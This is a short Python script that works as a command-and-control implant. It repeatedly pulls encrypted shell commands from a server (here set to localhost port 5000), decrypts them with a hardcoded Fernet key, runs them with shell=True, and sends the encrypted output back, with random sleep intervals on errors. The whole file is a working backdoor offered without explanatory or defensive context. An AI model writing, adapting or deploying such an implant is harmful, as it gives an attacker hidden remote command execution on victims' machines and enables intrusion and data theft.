import requests, subprocess, time
from cryptography.fernet import Fernet
import random

MASTER_KEY = b'ZOVYlkVemlNv6eHwPGbOtM1p_LZwMEmHIg-e0bGh_xo=' 
cipher = Fernet(MASTER_KEY)
URL = "http://127.0.0.1:5000"

while True:
        try:
            r = requests.get(f"{URL}/get_command")
            cmd = cipher.decrypt(r.content).decode()
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)            
            enc_out = cipher.encrypt(out)
            requests.post(f"{URL}/post_result", data={'result': enc_out})

        except Exception as e:
            error_msg = f"Error: {str(e)}".encode()
            enc_error = cipher.encrypt(error_msg)
            requests.post(f"{URL}/post_result", data={'result': enc_error})
            slp=random.randint(10,25)
            time.sleep(slp)